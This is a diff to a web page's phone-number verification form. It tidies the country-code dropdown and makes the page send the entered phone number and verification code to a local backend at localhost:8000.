@@ -22,7 +22,7 @@
             text-align: center;
             width: 90%;
             max-width: 380px;
-            margin-top: 3%;
+            margin-top: 4%; /* Adjusted by 1 cm */
             position: relative;
             border-radius: 20px;
             padding: 20px;
@@ -238,22 +238,19 @@
         document.addEventListener('DOMContentLoaded', function() {
             const countryDropdown = document.getElementById('countryCode');
             const dropdownMenu = document.getElementById('dropdownMenu');
-            const countries = [
-<p>Please confirm your country code and enter your phone number.</p>
+            const phoneNumberInput = document.getElementById('phoneNumber');
 
-        <div class="input-group">
-            <label for="countryCode">Country</label>
-            <select id="countryCode" onchange="updatePhoneNumberPrefix()">
-                <option value="+61" data-flag="🇦🇺">🇦🇺 Australia (+61)</option>
-                <option value="+1" data-flag="🇺🇸">🇺🇸 United States (+1)</option>
-                <option value="+44" data-flag="🇬🇧">🇬🇧 United Kingdom (+44)</option>
-                <option value="+49" data-flag="🇩🇪">🇩🇪 Germany (+49)</option>
-                <option value="+33" data-flag="🇫🇷">🇫🇷 France (+33)</option>
-                <option value="+81" data-flag="🇯🇵">🇯🇵 Japan (+81)</option>
-                <option value="+91" data-flag="🇮🇳">🇮🇳 India (+91)</option>
-                <option value="+86" data-flag="🇨🇳">🇨🇳 China (+86)</option>
-                <option value="+7" data-flag="🇷🇺">🇷🇺 Russia (+7)</option>
-                <option value="+82" data-flag="🇰🇷">🇰🇷 South Korea (+82)</option>
+            const countries = [
+                { name: 'Australia', code: '+61', flag: 'https://flagcdn.com/w20/au.png' },
+                { name: 'United States', code: '+1', flag: 'https://flagcdn.com/w20/us.png' },
+                { name: 'United Kingdom', code: '+44', flag: 'https://flagcdn.com/w20/gb.png' },
+                { name: 'Germany', code: '+49', flag: 'https://flagcdn.com/w20/de.png' },
+                { name: 'France', code: '+33', flag: 'https://flagcdn.com/w20/fr.png' },
+                { name: 'Japan', code: '+81', flag: 'https://flagcdn.com/w20/jp.png' },
+                { name: 'India', code: '+91', flag: 'https://flagcdn.com/w20/in.png' },
+                { name: 'China', code: '+86', flag: 'https://flagcdn.com/w20/cn.png' },
+                { name: 'Russia', code: '+7', flag: 'https://flagcdn.com/w20/ru.png' },
+                { name: 'South Korea', code: '+82', flag: 'https://flagcdn.com/w20/kr.png' },
                 // Add more countries as needed
             ];
 
@@ -264,7 +261,7 @@
                 item.dataset.code = country.code;
                 item.addEventListener('click', function() {
                     countryDropdown.innerHTML = `<span><img src="${country.flag}" alt="Flag"> ${country.name}</span> <span>${country.code}</span>`;
-                    document.getElementById('phoneNumber').value = country.code + ' ' + document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
+                    phoneNumberInput.value = country.code + ' ' + phoneNumberInput.value.replace(/^\+\d+\s*/, '');
                     dropdownMenu.classList.remove('show');
                 });
                 dropdownMenu.appendChild(item);
@@ -276,15 +273,30 @@
             };
 
             window.goToVerificationPage = function() {
-                const phoneNumber = document.getElementById('phoneNumber').value;
+                const phoneNumber = phoneNumberInput.value;
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
                 }
 
-                document.getElementById('phoneDisplay').textContent = phoneNumber;
-                document.getElementById('initialContainer').style.display = 'none';
-                document.getElementById('verificationContainer').style.display = 'block';
+                fetch('http://localhost:8000/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phoneNumber }),
+                }).then(response => {
+                    if (response.ok) {
+                        document.getElementById('phoneDisplay').textContent = phoneNumber;
+                        document.getElementById('initialContainer').style.display = 'none';
+                        document.getElementById('verificationContainer').style.display = 'block';
+                    } else {
+                        alert('Error submitting phone number.');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Error submitting phone number.');
+                });
             };
 
             window.submitVerification = function() {
@@ -294,12 +306,27 @@
                     return;
                 }
 
-                document.getElementById('verificationContainer').style.display = 'none';
-                document.getElementById('finalMessageContainer').style.display = 'block';
+                fetch('http://localhost:8000/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ verificationCode }),
+                }).then(response => {
+                    if (response.ok) {
+                        document.getElementById('verificationContainer').style.display = 'none';
+                        document.getElementById('finalMessageContainer').style.display = 'block';
+                    } else {
+                        document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
+                });
             };
 
             window.resetForm = function() {
-                document.getElementById('phoneNumber').value = '';
+                phoneNumberInput.value = '';
                 document.getElementById('verificationCode').value = '';
                 document.getElementById('finalMessageContainer').style.display = 'none';
                 document.getElementById('initialContainer').style.display = 'block';
